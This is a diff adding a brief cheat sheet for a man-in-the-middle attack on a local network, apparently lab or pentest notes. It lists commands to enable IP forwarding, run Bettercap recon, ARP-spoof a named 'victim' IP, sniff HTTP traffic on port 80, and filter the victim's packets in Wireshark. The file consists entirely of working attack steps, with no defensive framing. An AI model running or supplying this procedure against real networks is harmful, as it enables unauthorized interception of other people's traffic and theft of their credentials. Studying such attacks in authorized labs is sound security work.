@@ -1,0 +1,27 @@
+Commands
+
+ Ip forwarding: echo 1  | sudo tee  /proc/sys/net/ipv4/ip_forward
+
+ confirmation: cat /proc/sys/net/ipv4/ip_forward
+
+Get your own IP: ip a
+
+Ping your victim’s IP: ping 192.168.1.10 (eg)
+ 
+Start Bettercap: sudo bettercap -iface eth0
+
+Network Recon:  net.probe on
+                 net.recon on
+                 net.show
+
+Set Victim IP for Targeted ARP Spoofing: set arp.spoof.targets <victim_ip>
+                                          arp.spoof on
+
+Start Network Sniffing: set net.sniff.verbose true
+                        set net.sniff.filter tcp port 80
+                        net.sniff on
+wireshark: wireshark
+
+analyze: ip.addr == <victim_ip>
+         http.request
+          
